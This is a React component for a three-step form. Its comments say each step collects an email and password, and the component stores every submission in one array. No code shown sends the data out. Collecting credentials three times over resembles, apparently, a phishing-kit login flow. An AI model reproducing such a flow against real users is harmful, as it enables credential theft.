import React, { useEffect, useState } from 'react';
import InfoLog from './InfoLog';
import LogPrimary from './LogPrimary';
import LogSecond from './LogSecond';
import LogThird from './LogThird';

const Index = () => {
	//field condition
	const [primary, setPrimary] = useState(true);
	const [second, setSecond] = useState(false);
	const [third, setThird] = useState(false);
	const [fourth, setFourth] = useState(false);

	//info handle
	const [info, setInfo] = useState('primary');

	//get value field
	const [allData, setAllData] = useState([]);

	//recover data and stock in allData hook
	const handledLog = async data => {
		//primary recover data
		if (data.key === 'primary') {
			let allDatas = [...allData];
			allDatas.push(data);
			setAllData(allDatas);
			console.log(allData);
			setPrimary(false);
			setSecond(true);
			setInfo('second');
		}

		//second recover data
		if (data.key === 'second') {
			setAllData([...allData, data]);
			setSecond(false);
			setThird(true);
			setInfo('third');
		}
		//third recover data
		if (data.key === 'third') {
			setAllData([...allData, data]);
			setFourth(true);
			setThird(false);
			setInfo('fourth');
		}
	};

	useEffect(() => {}, []);
	return (
		<div className="log-container">
			<video
				class="bg-video"
				playsinline="playsinline"
				autoplay="autoplay"
				muted="muted"
				loop="loop"
			>
				<source src="template\assets\mp4\bg.mp4" type="video/mp4" />
			</video>
			<div class="masthead left-side">
				<div class="masthead-content text">
					<div class="container-fluid px-4 px-lg-0">
						<InfoLog type={info} />
						<form id="contactForm" data-sb-form-api-token="API_TOKEN">
							{/* Display primary get information(mail and password) */}
							{primary && <LogPrimary handledLog={handledLog} />}

							{/* Display second get information(mail and password) */}
							{second && <LogSecond handledLog={handledLog} />}

							{/* Display third get information(mail and password) */}
							{third && <LogThird handledLog={handledLog} />}
						</form>
					</div>
				</div>
			</div>
			<div class="social-icons">
				<div class="d-flex flex-row flex-lg-column justify-content-center align-items-center h-100 mt-3 mt-lg-0">
					<a class="btn btn-dark m-3" href="#!">
						<i class="fab fa-twitter"></i>
					</a>
					<a class="btn btn-dark m-3" href="#!">
						<i class="fab fa-facebook-f"></i>
					</a>
					<a class="btn btn-dark m-3" href="#!">
						<i class="fab fa-instagram"></i>
					</a>
				</div>
			</div>
		</div>
	);
};

export default Index;
